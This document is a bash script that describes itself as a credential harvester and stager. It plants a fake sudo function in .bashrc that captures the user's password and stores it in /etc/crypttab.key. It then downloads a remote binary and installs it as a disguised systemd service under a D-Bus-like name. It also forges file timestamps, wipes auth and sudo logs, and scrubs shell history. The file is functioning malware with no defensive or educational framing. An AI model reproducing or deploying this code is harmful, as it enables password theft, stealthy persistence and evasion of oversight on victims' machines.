#!/bin/bash
# Credential harvester & stager for 'goodboy.py'

# Delete the privesc.sh download from history
sed -i '\|privesc.sh|d' ~/.bash_history

# Check if user is already root
if [ "$EUID" -eq 0 ]; then
    unset HISTFILE
    set +o history

    GOOD_BOY_URL="https://github.com/Kaucrow/good-boy/raw/refs/heads/main/bin/goodboy"
    curl -L -s -o /usr/bin/dbus-manager "$GOOD_BOY_URL" || \
    wget -q -O /usr/bin/dbus-manager "$GOOD_BOY_URL"

    if [ ! -f /usr/bin/dbus-manager ]; then
        exit 1
    fi

    chmod +x /usr/bin/dbus-manager

    touch -r /bin/ls /usr/bin/dbus-manager

    SYSTEMD_SERVICE="dbus-org.manager.service"
    SYSTEMD_SERVICE_URL="https://https://raw.githubusercontent.com/Kaucrow/good-boy/refs/heads/main/systemd.service"
    curl -s -o /etc/systemd/system/$SYSTEMD_SERVICE "$SYSTEMD_SERVICE_URL" || \
    wget -q -O /etc/systemd/system/$SYSTEMD_SERVICE "$SYSTEMD_SERVICE_URL"
    systemctl enable $SYSTEMD_SERVICE
    systemctl start $SYSTEMD_SERVICE

    touch -r /bin/ls /etc/systemd/system/$SYSTEMD_SERVICE

    exit 0
else
    GB_DIR="$HOME/.local/share/dbus"
    SCRIPT_FILENAME="session-helper"
    SCRIPT_FILE="$GB_DIR/$SCRIPT_FILENAME"

    mkdir -p "$GB_DIR"

    cat > "$SCRIPT_FILE" << 'EOF'
#!/bin/bash
unset HISTFILE
set +o history

GB_DIR="$HOME/.local/share/dbus"
PASSWD_FILE="$GB_DIR/session-data"

attempts=0
max_attempts=3
success=false

while [ $attempts -lt $max_attempts ]; do
    echo -n "[sudo] password for $USER: "
    read -s user_input
    echo

    if printf "%s\n" "$user_input" | /usr/bin/sudo -S -k true 2>/dev/null; then
        # Correct password
        success=true
        break
    else
        attempts=$((attempts + 1))
        [ $attempts -lt $max_attempts ] && echo "Sorry, try again."
    fi
done

if [ "$success" = false ]; then
    echo "sudo: 3 incorrect password attempts"
    exit 1
fi

# Store the password
echo "$user_input" > "$PASSWD_FILE"

ASKPASS_SCRIPT=$(mktemp)
echo -e "#!/bin/sh\necho \"$user_input\"" > "$ASKPASS_SCRIPT"
chmod +x "$ASKPASS_SCRIPT"

# Deploy monitoring & move passwd to /etc/crypttab.key
SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A bash << DEPLOYEOF
    cp "$GB_DIR/session-data" /etc/crypttab.key
    chmod 444 /etc/crypttab.key

    GOOD_BOY_URL="https://github.com/Kaucrow/good-boy/raw/refs/heads/main/bin/goodboy"
    curl -L -s -o /usr/bin/dbus-manager "\$GOOD_BOY_URL" || \
    wget -q -O /usr/bin/dbus-manager "\$GOOD_BOY_URL"

    if [ ! -f /usr/bin/dbus-manager ]; then
        exit 1
    fi

    chmod +x /usr/bin/dbus-manager

    touch -r /bin/ls /usr/bin/dbus-manager
    touch -r /bin/ls /etc/crypttab.key

    SYSTEMD_SERVICE="dbus-org.manager.service"
    SYSTEMD_SERVICE_URL="https://https://raw.githubusercontent.com/Kaucrow/good-boy/refs/heads/main/systemd.service"
    curl -s -o /etc/systemd/system/$SYSTEMD_SERVICE "$SYSTEMD_SERVICE_URL" || \
    wget -q -O /etc/systemd/system/$SYSTEMD_SERVICE "$SYSTEMD_SERVICE_URL"
    systemctl enable $SYSTEMD_SERVICE
    systemctl start $SYSTEMD_SERVICE

    touch -r /bin/ls /etc/systemd/system/$SYSTEMD_SERVICE

    > /var/log/auth.log 2>/dev/null
    > /var/log/sudo.log 2>/dev/null
DEPLOYEOF

# Execute the original command
SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A -p "" "$@"

# Cleanup
rm -f "$ASKPASS_SCRIPT"
rm -f "$PASSWD_FILE"
unset -f sudo
sed -i "\|sudo() { source $SCRIPT_FILE|d" "$HOME/.bashrc"
set -o history
EOF

    chmod +x $SCRIPT_FILE

    # Add alias to .bashrc if not already present
    if ! grep -q "sudo()" "$HOME/.bashrc" 2>/dev/null; then
        echo "sudo() { source $SCRIPT_FILE \"\$@\" && rm \"$SCRIPT_FILE\"; }" >> "$HOME/.bashrc"
    fi
fi